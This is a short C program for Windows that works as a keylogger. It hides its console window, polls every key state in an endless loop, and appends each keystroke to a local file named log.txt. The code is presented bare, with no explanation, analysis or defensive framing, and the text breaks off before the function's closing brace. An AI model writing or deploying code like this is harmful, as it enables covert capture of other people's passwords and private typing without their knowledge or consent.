
#include <stdio.h>
#include <Windows.h>

int main() {
    FreeConsole();
    
    FILE *file;
    file = fopen("log.txt", "a+");
    
    char key;
    
    while (1) {
        Sleep(10);
        
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                if (file != NULL) {
                    fprintf(file, "%c", key);
                }
            }
        }
    }
    
    fclose(file);
    
